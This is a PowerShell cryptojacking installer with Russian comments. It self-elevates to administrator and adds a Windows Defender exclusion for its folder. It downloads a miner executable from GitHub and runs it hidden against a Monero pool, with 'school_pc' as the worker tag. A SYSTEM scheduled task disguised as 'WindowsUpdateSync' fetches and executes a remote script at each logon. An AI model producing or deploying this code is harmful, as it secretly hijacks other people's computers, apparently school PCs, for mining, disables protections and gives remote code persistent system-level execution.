# 0. Самовозвышение до Администратора (Лифт)
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Break
}

# --- КОНФИГУРАЦИЯ ---
$path = "C:\ProgramData\SystemLib"
$wallet = "Ltc1ql404nad6rja6paas9h7dnd2uwmkju3re3s4tuf"
$procName = "WinDirectX"
$exeUrl = "https://github.com/Isfandiyor0112-star/sminers/raw/main/WinDirectX.exe"
$rawScript = "https://raw.githubusercontent.com/Isfandiyor0112-star/sminers/refs/heads/main/win_utility.ps1"

Write-Host "--- ЗАПУСК СИСТЕМЫ С ПРАВАМИ АДМИНИСТРАТОРА ---" -ForegroundColor Cyan

# 1. Остановка старых процессов
Write-Host "[1/8] Очистка старых процессов..." -NoNewline
Stop-Process -Name $procName -Force -ErrorAction SilentlyContinue
Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue
Write-Host " Готово." -ForegroundColor Green

# 2. Настройка питания
powercfg /x -standby-timeout-ac 0 > $null
powercfg /x -monitor-timeout-ac 5 > $null

# 3. Работа с папкой и Антивирусом
if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue

# 4. Скачивание Майнера
Write-Host "[4/8] Загрузка ядра майнера..." -NoNewline
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $exeUrl -OutFile "$path\$procName.exe" -ErrorAction Stop
    Write-Host " Успешно." -ForegroundColor Green
} catch {
    Write-Host " Ошибка загрузки!" -ForegroundColor Red; exit
}

 
# 5. Создание файлов запуска (Маскировка + Низкий приоритет)
$cmd = "@echo off`n$path\$procName.exe --title $procName --priority 1 --cpu-max-threads-hint 50 -o gulf.moneroocean.stream:10128 -u $wallet -p school_pc --algo rx/0 --donate-level 1"
$cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
$vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False"
$vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii

# 6. Умная Автозагрузка (через Планировщик задач - ПРАВА SYSTEM)
Write-Host "[6/8] Настройка скрытой службы..." -NoNewline
$taskName = "WindowsUpdateSync"
$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-WindowStyle Hidden -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; irm '$rawScript' | iex"""
$trigger = New-ScheduledTaskTrigger -AtLogOn
# Регистрируем задачу от имени SYSTEM
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -User "System" -RunLevel Highest -Force | Out-Null
Write-Host " Ок." -ForegroundColor Green

# 7. Функции контроля (check, update, delete)
$ProfilePath = $PROFILE
if (!(Test-Path $ProfilePath)) { New-Item -Type File -Path $ProfilePath -Force | Out-Null }
$Functions = @"
function check {
    `$p = Get-Process $procName -ErrorAction SilentlyContinue
    if (`$p) { 
        Write-Host "СТАТУС: РАБОТАЕТ" -ForegroundColor Green 
        Write-Host "Память: `$([Math]::Round(`$p.WorkingSet64 / 1MB, 2)) MB" -ForegroundColor White
    } else { Write-Host "СТАТУС: ВЫКЛЮЧЕН" -ForegroundColor Red }
}
function update { 
    Write-Host "Обновление с GitHub..." -ForegroundColor Cyan
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    irm '$rawScript' | iex 
}
function delete {
    Write-Host "ПОЛНОЕ УДАЛЕНИЕ СИСТЕМЫ..." -ForegroundColor Red
    Stop-Process -Name "$procName" -Force -ErrorAction SilentlyContinue
    Unregister-ScheduledTask -TaskName "$taskName" -Confirm:`$false -ErrorAction SilentlyContinue
    Remove-Item -Path "$path" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SystemUpdate.vbs" -ErrorAction SilentlyContinue
    Write-Host "Файлы и задачи удалены. Очистка профиля..." -ForegroundColor Yellow
    Clear-Content -Path "`$PROFILE" -ErrorAction SilentlyContinue
    Write-Host "ГОТОВО. Система полностью удалена." -ForegroundColor Green
}
"@
$Functions | Out-File -FilePath $ProfilePath -Force

# 8. Запуск
Start-Process -FilePath "$path\win_start.vbs"
Write-Host "`n--- ВСЁ ГОТОВО! СИСТЕМА АКТИВИРОВАНА ---" -ForegroundColor Magenta
Write-Host "Команды: check, update, delete" -ForegroundColor Gray
